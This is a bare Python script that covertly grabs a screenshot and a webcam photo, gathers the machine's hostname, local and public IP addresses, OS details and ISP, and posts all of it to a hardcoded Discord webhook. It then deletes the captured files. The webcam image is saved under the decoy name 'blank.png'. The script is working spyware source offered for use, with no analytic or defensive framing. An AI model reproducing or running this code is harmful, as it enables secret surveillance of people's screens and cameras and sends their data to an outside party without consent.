# install all these libraries first 

import requests
import socket
import platform
import cv2
import os
from PIL import ImageGrab

WEBHOOK_URL = 'https://discord.com/api/webhooks/1304152509845340251/74tE2N2FhHXsk6MB9EbzjHly-5ef9VQFX_qqdvppo9j3SotzWgaNS05ZY2tSJ8WIgso0'

def capture_screenshot():
    screenshot = ImageGrab.grab()
    screenshot_path = os.path.join(os.getcwd(), 'screenshot.png')
    screenshot.save(screenshot_path)
    return screenshot_path

def capture_webcam_image():
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        webcam_path = os.path.join(os.getcwd(), 'blank.png')
        cv2.imwrite(webcam_path, frame)
        cam.release()
        return webcam_path
    cam.release()
    return None

def d_info():
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    user_agent = f"{platform.system()} {platform.release()} ({platform.version()})"
    ip_info = requests.get('https://ipinfo.io').json()
    public_ip = ip_info.get('ip', 'Unknown')
    isp = ip_info.get('org', 'Unknown')
    return hostname, local_ip, user_agent, public_ip, isp

def send(screenshot_path, webcam_path, hostname, local_ip, user_agent, public_ip, isp):
    files = {
        "file1": open(screenshot_path, "rb"),
        "file2": open(webcam_path, "rb") if webcam_path else None
    }
    data = {
        "content": f"[+] Device Information:\n**[+] Hostname**: {hostname}\n**[+] Server IP**: {local_ip}\n**[+] User-Agent**: {user_agent}\n**[+] IPv4**: {public_ip}\n**[+] ISP**: {isp}"
    }
    try:
        response = requests.post(WEBHOOK_URL, data=data, files=files)
        if response.status_code == 204:
            print("Data sent successfully!")
        else:
            print(f"Failed to send data - status code {response.status_code}")
    except Exception as e:
        print(f"Error sending data: {e}")
    for file in files.values():
        if file:
            file.close()
            os.remove(file.name)

def main():
    screenshot_path = capture_screenshot()
    webcam_path = capture_webcam_image()
    hostname, local_ip, user_agent, public_ip, isp = d_info()
    send(screenshot_path, webcam_path, hostname, local_ip, user_agent, public_ip, isp)

if __name__ == "__main__":
    main()
